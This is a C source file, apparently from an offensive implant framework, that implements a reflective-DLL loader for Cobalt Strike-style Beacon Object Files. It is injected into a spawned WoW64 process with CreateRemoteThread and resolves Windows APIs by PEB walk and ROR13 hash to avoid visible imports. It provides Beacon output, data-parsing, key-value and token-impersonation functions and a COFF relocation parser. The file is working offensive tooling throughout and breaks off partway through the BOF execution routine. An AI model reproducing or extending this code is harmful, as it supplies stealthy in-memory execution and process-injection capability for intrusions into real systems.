/*
 * loader.c — slice 1.d phase B-bis (reflective-DLL model).
 *
 * Compiled as a regular i386 DLL with relocations preserved. The
 * parent Go orchestrator parses the PE header, VirtualAllocEx's
 * a single image-sized region inside a freshly-spawned WoW64 host,
 * WriteProcessMemory's each section at its RVA, applies the
 * .reloc table against the new image base, VirtualProtectEx's
 * section protections, then CreateRemoteThread targets the
 * exported BOFExec address.
 *
 * No disk, no LoadLibrary, no rundll32 argv. Pattern is
 * Stephen-Fewer-style manual reflective loading; the loader DLL
 * doesn't need a reflective stub of its own because the parent
 * applies relocations from the outside.
 *
 * The DLL has no static imports beyond kernel32 — we resolve
 * everything via PEB walk + ROR13 at run time because the manual
 * mapping bypasses the OS PE loader's import resolution.
 *
 * Inside the DLL:
 *   - DllMain: returns TRUE (never actually invoked — manual map
 *     skips the entry point in the optional header).
 *   - BOFExec(loader_params_t *p): the CreateRemoteThread target.
 *     Validates the params block, walks PEB to find kernel32,
 *     resolves the kernel32 API set via ROR13, parses the BOF .o
 *     out of params->bof_addr, copies sections, applies relocations
 *     (DIR32 / DIR32NB / REL32 / ABSOLUTE for i386 BOFs), then
 *     calls the BOF's "go" entry cdecl with (args, args_len).
 *
 * The Beacon API surface (BeaconPrintf / BeaconOutput / etc.) is
 * implemented inside this DLL — external __imp__Beacon* symbols
 * in the BOF resolve to in-DLL function pointers via ROR13
 * hashing of the symbol name (with the i386 leading `_` + the
 * `__imp_` indirect prefix stripped).
 *
 * Build (maintainer only — `go build` ships the .dll bytes via
 * go:embed):
 *
 *   bash scripts/build-bof-x86-loader.sh
 */

#include <windows.h>
#include <stdint.h>

/* windows.h defines RtlMoveMemory as a #define for memmove on
 * mingw32, which collides with our function-pointer field. Undef
 * here; we use the resolved kernel32!RtlMoveMemory directly. */
#ifdef RtlMoveMemory
#undef RtlMoveMemory
#endif

#include "abi.h"

/* — Globals --------------------------------------------------------
 *
 * Set once by BOFExec on entry; read by every Beacon API stub.
 * Safe because manual mapping applies relocations against the
 * DLL's .data section before CreateRemoteThread fires, and the
 * loader is single-threaded per child process. */

static loader_params_t *g_params = 0;

typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
typedef int   __stdcall (*pfn_VirtualFree)(void *addr, uint32_t size, uint32_t freeType);
typedef void *__stdcall (*pfn_LoadLibraryA)(const char *name);
typedef uint32_t __stdcall (*pfn_GetCurrentProcess)(void);
typedef int   __stdcall (*pfn_CloseHandle)(void *h);
/* advapi32 */
typedef int   __stdcall (*pfn_ImpersonateLoggedOnUser)(void *token);
typedef int   __stdcall (*pfn_RevertToSelf)(void);
typedef int   __stdcall (*pfn_OpenProcessToken)(void *proc, uint32_t access, void **outTok);
typedef int   __stdcall (*pfn_GetTokenInformation)(void *tok, int infoClass, void *info, uint32_t infoLen, uint32_t *outLen);

/* Note: RtlMoveMemory is intentionally NOT resolved through
 * kernel32. On Windows 7+ kernel32 exports RtlMoveMemory as a
 * forwarder to ntdll.RtlMoveMemory — our ROR13 walker would
 * return the forwarder string's address, not executable code,
 * and calling it crashes inside the WoW64 helper. We use the
 * tiny loader_memcpy primitive below instead. See
 * win/api/resolve_windows.go:91 for the parent-side counterpart
 * that DOES follow forwarders; the loader chooses simplicity. */

typedef struct {
    pfn_ExitThread         ExitThread;
    pfn_VirtualAlloc       VirtualAlloc;
    pfn_VirtualProtect     VirtualProtect;
    pfn_VirtualFree        VirtualFree;
    pfn_LoadLibraryA       LoadLibraryA;
    pfn_GetCurrentProcess  GetCurrentProcess;
    pfn_CloseHandle        CloseHandle;
} kernel32_api_t;

typedef struct {
    pfn_ImpersonateLoggedOnUser ImpersonateLoggedOnUser;
    pfn_RevertToSelf            RevertToSelf;
    pfn_OpenProcessToken        OpenProcessToken;
    pfn_GetTokenInformation     GetTokenInformation;
} advapi32_api_t;

/* loader_memcpy — byte-wise copy used for COFF section data and
 * Beacon output buffers. Tiny and forwarder-immune. */
static void loader_memcpy(void *dst, const void *src, uint32_t n)
{
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    for (uint32_t i = 0; i < n; i++) d[i] = s[i];
}

static kernel32_api_t g_kapi;
static advapi32_api_t g_aapi;  /* populated lazily on first Token/IsAdmin call */

/* — Hash + PEB walk (kept from the flat-PIC version) ------------- */

#define HASH_EXIT_THREAD          0x60E0CEEFu
#define HASH_VIRTUAL_ALLOC        0x91AFCA54u
#define HASH_VIRTUAL_PROTECT      0x7946C61Bu
#define HASH_VIRTUAL_FREE         0x030633ACu  /* VirtualFree */
#define HASH_LOAD_LIBRARY_A       0xEC0E4E8Eu  /* LoadLibraryA */
#define HASH_GET_CURRENT_PROCESS  0x7B8F17E6u  /* GetCurrentProcess */
#define HASH_CLOSE_HANDLE         0x0FFD97FBu  /* CloseHandle */
/* advapi32 exports — resolved lazily; loader doesn't require advapi32
 * unless the BOF actually imports a Token/IsAdmin symbol. */
#define HASH_IMPERSONATE_LOGGED_ON_USER  0x6D821B37u
#define HASH_REVERT_TO_SELF              0x50DEC82Au
#define HASH_OPEN_PROCESS_TOKEN          0x591EA70Fu
#define HASH_GET_TOKEN_INFORMATION       0xDBDB6E5Au

static uint32_t ror13_hash(const uint8_t *s)
{
    uint32_t h = 0;
    while (*s) {
        h = ((h >> 13) | (h << 19)) + (uint32_t)*s;
        s++;
    }
    return h;
}

static inline uint32_t get_peb32(void)
{
    uint32_t peb;
    __asm__ volatile ("mov %0, fs:0x30" : "=r"(peb));
    return peb;
}

static uint32_t find_kernel32_base(void)
{
    uint32_t peb = get_peb32();
    uint32_t ldr = *(uint32_t *)(peb + 0x0C);
    uint32_t e   = *(uint32_t *)(ldr + 0x14);
    e = *(uint32_t *)e;
    e = *(uint32_t *)e;
    return *(uint32_t *)(e + 0x10);
}

static uint32_t resolve_by_hash(uint32_t module_base, uint32_t wanted)
{
    uint8_t *base = (uint8_t *)module_base;
    uint32_t pe = *(uint32_t *)(base + 0x3C);
    uint32_t exp_rva = *(uint32_t *)(base + pe + 0x78);
    if (!exp_rva) return 0;
    uint8_t *exp_dir = base + exp_rva;
    uint32_t n_names   = *(uint32_t *)(exp_dir + 0x18);
    uint32_t names_rva = *(uint32_t *)(exp_dir + 0x20);
    uint32_t funcs_rva = *(uint32_t *)(exp_dir + 0x1C);
    uint32_t ords_rva  = *(uint32_t *)(exp_dir + 0x24);
    uint32_t *names = (uint32_t *)(base + names_rva);
    uint32_t *funcs = (uint32_t *)(base + funcs_rva);
    uint16_t *ords  = (uint16_t *)(base + ords_rva);
    for (uint32_t i = 0; i < n_names; i++) {
        if (ror13_hash(base + names[i]) == wanted) {
            return (uint32_t)(base + funcs[ords[i]]);
        }
    }
    return 0;
}

static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
{
    k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
    k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
    k->VirtualProtect    = (pfn_VirtualProtect)   resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
    k->VirtualFree       = (pfn_VirtualFree)      resolve_by_hash(k32, HASH_VIRTUAL_FREE);
    k->LoadLibraryA      = (pfn_LoadLibraryA)     resolve_by_hash(k32, HASH_LOAD_LIBRARY_A);
    k->GetCurrentProcess = (pfn_GetCurrentProcess)resolve_by_hash(k32, HASH_GET_CURRENT_PROCESS);
    k->CloseHandle       = (pfn_CloseHandle)      resolve_by_hash(k32, HASH_CLOSE_HANDLE);
    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect && k->VirtualFree
        && k->LoadLibraryA && k->GetCurrentProcess && k->CloseHandle;
}

/* ensure_advapi resolves the advapi32 export set lazily. Returns 1
 * on success, 0 if any export couldn't be resolved (the caller
 * surfaces a benign no-op so a BOF that calls Token APIs without
 * the OS having advapi32 available gets a clean "did nothing"
 * rather than a crash). */
static int ensure_advapi(void)
{
    if (g_aapi.ImpersonateLoggedOnUser) return 1;  /* already done */

    /* "advapi32.dll" via stack-local char array so the linker
     * doesn't strand the string in a .rdata slot that needs an
     * extra reloc the manual loader already handles. */
    char name[13];
    name[0]='a'; name[1]='d'; name[2]='v'; name[3]='a'; name[4]='p';
    name[5]='i'; name[6]='3'; name[7]='2'; name[8]='.'; name[9]='d';
    name[10]='l'; name[11]='l'; name[12]=0;

    void *a32 = g_kapi.LoadLibraryA(name);
    if (!a32) return 0;

    g_aapi.ImpersonateLoggedOnUser = (pfn_ImpersonateLoggedOnUser)
        resolve_by_hash((uint32_t)a32, HASH_IMPERSONATE_LOGGED_ON_USER);
    g_aapi.RevertToSelf = (pfn_RevertToSelf)
        resolve_by_hash((uint32_t)a32, HASH_REVERT_TO_SELF);
    g_aapi.OpenProcessToken = (pfn_OpenProcessToken)
        resolve_by_hash((uint32_t)a32, HASH_OPEN_PROCESS_TOKEN);
    g_aapi.GetTokenInformation = (pfn_GetTokenInformation)
        resolve_by_hash((uint32_t)a32, HASH_GET_TOKEN_INFORMATION);

    return g_aapi.ImpersonateLoggedOnUser && g_aapi.RevertToSelf
        && g_aapi.OpenProcessToken && g_aapi.GetTokenInformation;
}

/* — Beacon API surface (step 1.c minimal) ------------------------- */

/* All values cross-checked against the Go-side ROR13 (see
 * TestRor13_KnownAnswers_BeaconAPI). The earlier draft of this
 * file shipped guessed values; do not re-derive without running
 * the Go test. */
#define HASH_BEACON_PRINTF            0x7AE65208u
#define HASH_BEACON_OUTPUT            0x10EE8296u
#define HASH_BEACON_ERROR_D           0x0CD65221u
#define HASH_BEACON_ERROR_DD          0x910866F6u
#define HASH_BEACON_ERROR_NA          0x915866F3u
/* Data parsing */
#define HASH_BEACON_DATA_PARSE        0x7EB7A762u
#define HASH_BEACON_DATA_INT          0xF6547CDDu
#define HASH_BEACON_DATA_SHORT        0x8CAFD6B1u
#define HASH_BEACON_DATA_LENGTH       0x338C3323u
#define HASH_BEACON_DATA_EXTRACT      0x2ED5F81Fu
/* Format */
#define HASH_BEACON_FORMAT_ALLOC      0xA1A33C4Cu
#define HASH_BEACON_FORMAT_RESET      0x93544E1Du
#define HASH_BEACON_FORMAT_FREE       0x714535AAu
#define HASH_BEACON_FORMAT_APPEND     0xEABD4AFDu
#define HASH_BEACON_FORMAT_PRINTF     0x5CED6D47u
#define HASH_BEACON_FORMAT_INT        0xA688AEF7u
#define HASH_BEACON_FORMAT_TO_STRING  0x3ABFB373u
/* Helpers + KV (step 1.e) */
#define HASH_BEACON_GET_CUSTOM_USER_DATA 0x6918DD6Cu
#define HASH_BEACON_GET_SPAWN_TO         0x48540CFCu
#define HASH_TOWIDECHAR                  0xF9B61584u
#define HASH_BEACON_ADD_VALUE            0x17030221u
#define HASH_BEACON_GET_VALUE            0x170702E9u
#define HASH_BEACON_REMOVE_VALUE         0x07283C8Au
#define HASH_BEACON_USE_TOKEN            0xB2BEE46Au
#define HASH_BEACON_REVERT_TOKEN         0xAB981B1Au
#define HASH_BEACON_IS_ADMIN             0xFC3D55E0u

static uint32_t cstr_len(const char *s)
{
    uint32_t n = 0;
    while (s[n] != '\0') n++;
    return n;
}

static void append_out(const void *src, uint32_t n)
{
    if (n == 0 || !g_params) return;
    uint32_t room = g_params->out_cap - g_params->out_len;
    if (room == 0) return;
    if (n > room) n = room;
    loader_memcpy((uint8_t *)(g_params->out_addr + g_params->out_len), src, n);
    g_params->out_len += n;
}

static void append_err(const void *src, uint32_t n)
{
    if (n == 0 || !g_params) return;
    uint32_t room = g_params->err_cap - g_params->err_len;
    if (room == 0) return;
    if (n > room) n = room;
    loader_memcpy((uint8_t *)(g_params->err_addr + g_params->err_len), src, n);
    g_params->err_len += n;
}

/* BeaconPrintf — minimal: treats fmt as a literal NUL-terminated
 * string, no varargs expansion. Matches the x64 loader's default
 * behaviour (option (a) in docs/techniques/runtime/bof-loader.md);
 * BOFs that pass a literal format see correct output, those that
 * rely on `%`-expansion see the raw template. Step 1.c.2 will add
 * a tiny printf engine. */
__declspec(dllexport) void __cdecl BeaconPrintf(int type, const char *fmt)
{
    (void)type;
    if (!fmt) return;
    append_out(fmt, cstr_len(fmt));
}

__declspec(dllexport) void __cdecl BeaconOutput(int type, const char *data, int len)
{
    (void)type;
    if (!data || len <= 0) return;
    append_out(data, (uint32_t)len);
}

__declspec(dllexport) void __cdecl BeaconErrorD(int code, int v1)
{
    (void)code; (void)v1;
    char dot = '.';
    append_err(&dot, 1);
}

__declspec(dllexport) void __cdecl BeaconErrorDD(int code, int v1, int v2)
{
    (void)code; (void)v1; (void)v2;
    char dot = '.';
    append_err(&dot, 1);
}

__declspec(dllexport) void __cdecl BeaconErrorNA(int code)
{
    (void)code;
    char dot = '.';
    append_err(&dot, 1);
}

/* — Data parsing -------------------------------------------------
 *
 * datap layout (16 bytes on i386, matches beacon.h):
 *   0   char *original
 *   4   char *buffer
 *   8   int   length    (bytes remaining at buffer)
 *   12  int   size      (total)
 *
 * The reads are length-prefixed for BeaconDataExtract; 4-byte LE
 * for BeaconDataInt; 2-byte LE for BeaconDataShort. */
typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} bof_datap;

__declspec(dllexport) void __cdecl BeaconDataParse(bof_datap *p, char *buf, int size)
{
    if (!p) return;
    /* Buffer consumed verbatim — no envelope header. Matches the
     * x64 runtime/bof beaconDataParseImpl convention; Args.Pack()
     * produces length-prefixed values back-to-back with no
     * length-of-buffer prefix. */
    p->original = buf;
    p->buffer   = buf;
    p->size     = size;
    p->length   = size;
}

__declspec(dllexport) int __cdecl BeaconDataInt(bof_datap *p)
{
    if (!p || p->length < 4) return 0;
    uint8_t *b = (uint8_t *)p->buffer;
    int v = (int)((uint32_t)b[0] | ((uint32_t)b[1] << 8) |
                  ((uint32_t)b[2] << 16) | ((uint32_t)b[3] << 24));
    p->buffer += 4;
    p->length -= 4;
    return v;
}

__declspec(dllexport) short __cdecl BeaconDataShort(bof_datap *p)
{
    if (!p || p->length < 2) return 0;
    uint8_t *b = (uint8_t *)p->buffer;
    short v = (short)((uint16_t)b[0] | ((uint16_t)b[1] << 8));
    p->buffer += 2;
    p->length -= 2;
    return v;
}

__declspec(dllexport) int __cdecl BeaconDataLength(bof_datap *p)
{
    if (!p) return 0;
    return p->length;
}

__declspec(dllexport) char * __cdecl BeaconDataExtract(bof_datap *p, int *out_size)
{
    if (!p || p->length < 4) {
        if (out_size) *out_size = 0;
        return 0;
    }
    uint8_t *b = (uint8_t *)p->buffer;
    uint32_t len = (uint32_t)b[0] | ((uint32_t)b[1] << 8) |
                   ((uint32_t)b[2] << 16) | ((uint32_t)b[3] << 24);
    p->buffer += 4;
    p->length -= 4;
    if ((int)len > p->length) len = (uint32_t)p->length;
    char *out = p->buffer;
    p->buffer += len;
    p->length -= (int)len;
    if (out_size) *out_size = (int)len;
    return out;
}

/* — Format -------------------------------------------------------
 *
 * formatp shares datap's struct shape; BeaconFormatAlloc HeapAllocs
 * a fresh buffer the BOF appends into via Append/Int/Printf, then
 * ToString returns its contents + length. Free releases the heap
 * allocation. */
typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} bof_formatp;

__declspec(dllexport) void __cdecl BeaconFormatAlloc(bof_formatp *fp, int maxsz)
{
    if (!fp || maxsz <= 0) return;
    /* VirtualAlloc instead of HeapAlloc: on some Windows SKUs the
     * kernel32!HeapAlloc export is a forwarder to ntdll!RtlAllocateHeap
     * (same trap as kernel32!RtlMoveMemory — our ROR13 walker returns
     * the forwarder string's address, calling it crashes). VirtualAlloc
     * is always a real kernel32 function with code. The rundll32 helper
     * exits after each BOF so the per-call leak is reclaimed. */
    char *buf = (char *)g_kapi.VirtualAlloc(0, (uint32_t)maxsz,
        /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
        /* PAGE_READWRITE */ 0x04);
    fp->original = buf;
    fp->buffer   = buf;
    fp->size     = maxsz;
    fp->length   = 0;
}

__declspec(dllexport) void __cdecl BeaconFormatReset(bof_formatp *fp)
{
    if (!fp) return;
    fp->buffer = fp->original;
    fp->length = 0;
}

__declspec(dllexport) void __cdecl BeaconFormatFree(bof_formatp *fp)
{
    if (!fp || !fp->original) return;
    /* Matches BeaconFormatAlloc's VirtualAlloc above. dwSize must
     * be 0 for MEM_RELEASE. */
    g_kapi.VirtualFree(fp->original, 0, /* MEM_RELEASE */ 0x8000);
    fp->original = 0;
    fp->buffer   = 0;
    fp->size     = 0;
    fp->length   = 0;
}

__declspec(dllexport) void __cdecl BeaconFormatAppend(bof_formatp *fp, const char *src, int len)
{
    if (!fp || !src || len <= 0) return;
    int room = fp->size - fp->length;
    if (room <= 0) return;
    if (len > room) len = room;
    loader_memcpy(fp->original + fp->length, src, (uint32_t)len);
    fp->length += len;
    fp->buffer = fp->original + fp->length;
}

/* itoa with fixed base 10. Writes up to 11 chars + sign into `out`,
 * returns bytes written. Caller provides a buffer big enough. */
static uint32_t itoa10(int32_t value, char *out)
{
    uint32_t n = 0;
    uint32_t v;
    int neg = 0;
    if (value < 0) { neg = 1; v = (uint32_t)(-(int64_t)value); }
    else           { v = (uint32_t)value; }
    char tmp[16];
    uint32_t ti = 0;
    if (v == 0) tmp[ti++] = '0';
    else { while (v) { tmp[ti++] = '0' + (char)(v % 10); v /= 10; } }
    if (neg) out[n++] = '-';
    while (ti--) out[n++] = tmp[ti];
    return n;
}

__declspec(dllexport) void __cdecl BeaconFormatInt(bof_formatp *fp, int value)
{
    char buf[16];
    uint32_t n = itoa10((int32_t)value, buf);
    BeaconFormatAppend(fp, buf, (int)n);
}

/* BeaconFormatPrintf — same vararg trade-off as BeaconPrintf: fmt
 * copied verbatim, no `%` expansion (step 1.c.2 will add a tiny
 * vsnprintf if a fixture needs it). */
__declspec(dllexport) void __cdecl BeaconFormatPrintf(bof_formatp *fp, const char *fmt)
{
    if (!fmt) return;
    uint32_t n = cstr_len(fmt);
    BeaconFormatAppend(fp, fmt, (int)n);
}

__declspec(dllexport) char * __cdecl BeaconFormatToString(bof_formatp *fp, int *size)
{
    if (!fp) {
        if (size) *size = 0;
        return 0;
    }
    if (size) *size = fp->length;
    return fp->original;
}

/* — Helpers (step 1.e) ------------------------------------------- */

__declspec(dllexport) void __cdecl BeaconGetCustomUserData(char **buf, int *len)
{
    if (!g_params) {
        if (buf) *buf = 0;
        if (len) *len = 0;
        return;
    }
    if (buf) *buf = (char *)g_params->user_data_addr;
    if (len) *len = (int)g_params->user_data_len;
}

/* BeaconGetSpawnTo writes the configured spawn-to path into buf
 * (NUL-terminated, truncated to len-1 chars). x86 bool toggles
 * between x64 / x86 hosts in the canonical CS API, but the parent
 * orchestrator only tracks one path per BOF invocation
 * (params->spawn_to_addr) — we ignore the x86 flag and always
 * return the configured path, matching the in-process loader's
 * SetSpawnToX86 convention for the x86 case. */
__declspec(dllexport) void __cdecl BeaconGetSpawnTo(int x86, char *buf, int len)
{
    (void)x86;
    if (!buf || len <= 0) return;
    if (!g_params || !g_params->spawn_to_addr) {
        buf[0] = 0;
        return;
    }
    const char *src = (const char *)g_params->spawn_to_addr;
    int i = 0;
    while (i < len - 1 && src[i] != '\0') { buf[i] = src[i]; i++; }
    buf[i] = 0;
}

/* toWideChar — single-byte → UTF-16LE pass-through. The canonical
 * CS variant decodes UTF-8 multi-byte sequences; we only honour
 * the ASCII subset because every public BOF we've sampled passes
 * literal ASCII paths/names through toWideChar. `max` is the wide
 * char capacity of `dst`. Returns 1 on success, 0 on bad args. */
__declspec(dllexport) int __cdecl toWideChar(const char *src, unsigned short *dst, int max)
{
    if (!src || !dst || max <= 0) return 0;
    int i = 0;
    while (i < max - 1 && src[i] != '\0') {
        dst[i] = (unsigned short)(unsigned char)src[i];
        i++;
    }
    dst[i] = 0;
    return 1;
}

/* — KV store (step 1.e) ------------------------------------------
 *
 * Fixed-pool 32 entries — ample for BOFs we've sampled (most use
 * 1-3 stash slots). Keyed on ROR13(key); 0 hash collides with the
 * "empty" sentinel and gets bumped to 1 (cheap and stable).
 *
 * Scope is the BOF invocation (the rundll32 helper exits after
 * each Execute), so no inter-call leakage — matches the x64
 * loader's documented "cross-Run state goes through the implant"
 * contract. */

#define KV_MAX 32

typedef struct {
    uint32_t key_hash;   /* 0 = empty slot */
    void    *value;
} kv_entry_t;

static kv_entry_t g_kv[KV_MAX];

static uint32_t kv_hash(const char *key)
{
    uint32_t h = ror13_hash((const uint8_t *)key);
    return h == 0 ? 1u : h;
}

__declspec(dllexport) void __cdecl BeaconAddValue(const char *key, void *val)
{
    if (!key) return;
    uint32_t h = kv_hash(key);
    /* First pass: update existing. */
    for (int i = 0; i < KV_MAX; i++) {
        if (g_kv[i].key_hash == h) { g_kv[i].value = val; return; }
    }
    /* Second pass: claim first empty slot. */
    for (int i = 0; i < KV_MAX; i++) {
        if (g_kv[i].key_hash == 0) { g_kv[i].key_hash = h; g_kv[i].value = val; return; }
    }
    /* Pool full — silently drop, matching CS's no-op-on-error
     * convention for non-critical helpers. */
}

__declspec(dllexport) void * __cdecl BeaconGetValue(const char *key)
{
    if (!key) return 0;
    uint32_t h = kv_hash(key);
    for (int i = 0; i < KV_MAX; i++) {
        if (g_kv[i].key_hash == h) return g_kv[i].value;
    }
    return 0;
}

__declspec(dllexport) void __cdecl BeaconRemoveValue(const char *key)
{
    if (!key) return;
    uint32_t h = kv_hash(key);
    for (int i = 0; i < KV_MAX; i++) {
        if (g_kv[i].key_hash == h) {
            g_kv[i].key_hash = 0;
            g_kv[i].value    = 0;
            return;
        }
    }
}

/* — Token impersonation + IsAdmin (step 1.f) ---------------------
 *
 * Wraps advapi32!ImpersonateLoggedOnUser / RevertToSelf and
 * advapi32!OpenProcessToken + GetTokenInformation(TokenElevation).
 * advapi32 is resolved lazily via ensure_advapi(): some host
 * processes (rundll32 included on certain Windows builds) ship
 * advapi32 already loaded; if not, kernel32!LoadLibraryA pulls
 * it in. */

#define TOKEN_QUERY                  0x0008u
#define TOKEN_INFORMATION_ELEVATION  20  /* TokenElevation enum value */

__declspec(dllexport) int __cdecl BeaconUseToken(void *token)
{
    if (!ensure_advapi()) return 0;
    return g_aapi.ImpersonateLoggedOnUser(token);
}

__declspec(dllexport) void __cdecl BeaconRevertToken(void)
{
    if (!ensure_advapi()) return;
    g_aapi.RevertToSelf();
}

__declspec(dllexport) int __cdecl BeaconIsAdmin(void)
{
    if (!ensure_advapi()) return 0;
    void *tok = 0;
    if (!g_aapi.OpenProcessToken(
            (void *)(uintptr_t)g_kapi.GetCurrentProcess(),
            TOKEN_QUERY, &tok)) {
        return 0;
    }
    uint32_t elevation = 0;
    uint32_t ret_len = 0;
    int ok = g_aapi.GetTokenInformation(tok, TOKEN_INFORMATION_ELEVATION,
                                         &elevation, sizeof(elevation), &ret_len);
    g_kapi.CloseHandle(tok);
    if (!ok) return 0;
    return elevation != 0 ? 1 : 0;
}

static uint32_t beacon_resolve(uint32_t hash)
{
    /* Output / errors */
    if (hash == HASH_BEACON_PRINTF)         return (uint32_t)&BeaconPrintf;
    if (hash == HASH_BEACON_OUTPUT)         return (uint32_t)&BeaconOutput;
    if (hash == HASH_BEACON_ERROR_D)        return (uint32_t)&BeaconErrorD;
    if (hash == HASH_BEACON_ERROR_DD)       return (uint32_t)&BeaconErrorDD;
    if (hash == HASH_BEACON_ERROR_NA)       return (uint32_t)&BeaconErrorNA;
    /* Data parsing */
    if (hash == HASH_BEACON_DATA_PARSE)     return (uint32_t)&BeaconDataParse;
    if (hash == HASH_BEACON_DATA_INT)       return (uint32_t)&BeaconDataInt;
    if (hash == HASH_BEACON_DATA_SHORT)     return (uint32_t)&BeaconDataShort;
    if (hash == HASH_BEACON_DATA_LENGTH)    return (uint32_t)&BeaconDataLength;
    if (hash == HASH_BEACON_DATA_EXTRACT)   return (uint32_t)&BeaconDataExtract;
    /* Format */
    if (hash == HASH_BEACON_FORMAT_ALLOC)     return (uint32_t)&BeaconFormatAlloc;
    if (hash == HASH_BEACON_FORMAT_RESET)     return (uint32_t)&BeaconFormatReset;
    if (hash == HASH_BEACON_FORMAT_FREE)      return (uint32_t)&BeaconFormatFree;
    if (hash == HASH_BEACON_FORMAT_APPEND)    return (uint32_t)&BeaconFormatAppend;
    if (hash == HASH_BEACON_FORMAT_PRINTF)    return (uint32_t)&BeaconFormatPrintf;
    if (hash == HASH_BEACON_FORMAT_INT)       return (uint32_t)&BeaconFormatInt;
    if (hash == HASH_BEACON_FORMAT_TO_STRING) return (uint32_t)&BeaconFormatToString;
    /* Helpers */
    if (hash == HASH_BEACON_GET_CUSTOM_USER_DATA) return (uint32_t)&BeaconGetCustomUserData;
    if (hash == HASH_BEACON_GET_SPAWN_TO)         return (uint32_t)&BeaconGetSpawnTo;
    if (hash == HASH_TOWIDECHAR)                  return (uint32_t)&toWideChar;
    /* KV */
    if (hash == HASH_BEACON_ADD_VALUE)            return (uint32_t)&BeaconAddValue;
    if (hash == HASH_BEACON_GET_VALUE)            return (uint32_t)&BeaconGetValue;
    if (hash == HASH_BEACON_REMOVE_VALUE)         return (uint32_t)&BeaconRemoveValue;
    /* Token + IsAdmin (step 1.f) */
    if (hash == HASH_BEACON_USE_TOKEN)            return (uint32_t)&BeaconUseToken;
    if (hash == HASH_BEACON_REVERT_TOKEN)         return (uint32_t)&BeaconRevertToken;
    if (hash == HASH_BEACON_IS_ADMIN)             return (uint32_t)&BeaconIsAdmin;
    return 0;
}

/* — COFF i386 parser + relocation engine ------------------------- */

#define MAX_SECTIONS 32

/* IMAGE_SCN_MEM_EXECUTE + IMAGE_REL_I386_* come from winnt.h. */

#define COFF_HEADER_SIZE   20
#define COFF_SECTION_SIZE  40
#define COFF_RELOC_SIZE    10
#define COFF_SYMBOL_SIZE   18

#define HDR_MACHINE_OFF            0
#define HDR_NSECTIONS_OFF          2
#define HDR_PTR_SYMTAB_OFF         8
#define HDR_NSYMBOLS_OFF          12
#define HDR_SIZEOF_OPT_HDR_OFF    16

#define SEC_NAME_OFF               0
#define SEC_SIZE_OF_RAW_DATA_OFF  16
#define SEC_PTR_TO_RAW_DATA_OFF   20
#define SEC_PTR_TO_RELOCS_OFF     24
#define SEC_NUMBER_OF_RELOCS_OFF  32
#define SEC_CHARACTERISTICS_OFF   36

#define REL_VIRTUAL_ADDR_OFF       0
#define REL_SYMBOL_TBL_INDEX_OFF   4
#define REL_TYPE_OFF               8

#define SYM_NAME_OFF               0
#define SYM_VALUE_OFF              8
#define SYM_SECTION_NUMBER_OFF    12
#define SYM_NUMBER_OF_AUX_OFF     17

static inline uint16_t le16(const uint8_t *p) { return *(uint16_t *)p; }
static inline uint32_t le32(const uint8_t *p) { return *(uint32_t *)p; }
static inline void le32_put(uint8_t *p, uint32_t v) { *(uint32_t *)p = v; }

/* sym_name_at returns a pointer to the symbol name — short name
 * inline in the 8-byte field, or a string-table entry via the
 * long-name 8-byte form (first 4 bytes zero, next 4 bytes are
 * offset into string table). */
static const uint8_t *sym_name_at(const uint8_t *sym, const uint8_t *bof, uint32_t string_tbl_off)
{
    if (le32(sym + SYM_NAME_OFF) != 0) {
        return sym;  /* short name — caller compares up to 8 bytes or to NUL */
    }
    return bof + string_tbl_off + le32(sym + SYM_NAME_OFF + 4);
}

static uint32_t name_eq_underscore_go(const uint8_t *sym, const uint8_t *bof, uint32_t string_tbl_off)
{
    const uint8_t *name = sym_name_at(sym, bof, string_tbl_off);
    if (le32(sym + SYM_NAME_OFF) != 0) {
        /* short name: _go followed by NUL inside the 8-byte field */
        return name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == 0;
    }
    return name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == 0;
}

/* Hash an i386 external symbol name to look it up in the Beacon
 * table. The name on the wire looks like `__imp__BeaconPrintf`:
 *   - `__imp_` is the MSVC indirect-import prefix
 *   - `_BeaconPrintf` is the i386 C name (leading underscore)
 * We strip both prefixes before hashing so the result matches the
 * canonical CS name `BeaconPrintf`. */
static uint32_t hash_extern_sym(const uint8_t *name)
{
    uint32_t h = 0;
    uint32_t i = 0;
    /* Skip up to two leading underscores from __imp_ then one
     * underscore from the i386 prefix. The canonical form starts
     * with two-or-more underscores so we can be lenient: strip
     * all leading underscores. */
    while (name[i] == '_') i++;
    /* If the remaining name starts with "imp_", skip past it. */
    if (name[i] == 'i' && name[i+1] == 'm' && name[i+2] == 'p' && name[i+3] == '_') {
        i += 4;
        while (name[i] == '_') i++;
    }
    while (name[i] != '\0') {
        h = ((h >> 13) | (h << 19)) + (uint32_t)name[i];
        i++;
    }
    return h;
}

static uint32_t exec_bof(loader_params_t *p)
{
    const uint8_t *bof = (const uint8_t *)p->bof_addr;
    uint32_t bof_len   = p->bof_len;

    if (bof_len < COFF_HEADER_SIZE) {
        p->error_code = 0x10001;
        return LOADER_STATUS_LOAD_FAIL;
    }
    if (le16(bof + HDR_MACHINE_OFF) != 0x014c) {
        p->error_code = 0x10002;
        return LOADER_STATUS_LOAD_FAIL;
    }
    uint16_t nsec = le16(bof + HDR_NSECTIONS_OFF);
    if (nsec == 0 || nsec > MAX_SECTIONS) {
        p->error_code = 0x10003;
        return LOADER_STATUS_LOAD_FAIL;
    }
    uint16_t opt_hdr_size = le16(bof + HDR_SIZEOF_OPT_HDR_OFF);
    uint32_t sec_tbl_off  = COFF_HEADER_SIZE + opt_hdr_size;
    if (sec_tbl_off + (uint32_t)nsec * COFF_SECTION_SIZE > bof_len) {
        p->error_code = 0x10004;
        return LOADER_STATUS_LOAD_FAIL;
    }

